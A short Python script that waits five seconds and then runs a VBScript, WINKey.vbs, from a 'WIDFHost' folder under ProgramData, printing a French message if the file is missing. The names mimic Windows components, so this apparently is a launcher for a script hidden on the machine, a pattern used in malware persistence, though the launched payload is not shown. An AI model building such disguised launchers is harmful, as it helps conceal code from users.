import os
import subprocess
import time

chemin_executable = os.path.join(os.environ['ProgramData'], 'WIDFHost', 'WINKey.vbs')

time.sleep(5)

if os.path.isfile(chemin_executable):
    subprocess.run(['cscript.exe', chemin_executable])
else:
    print("Le script WINKey.vbs est introuvable dans le dossier WIDFHost de ProgramData.")
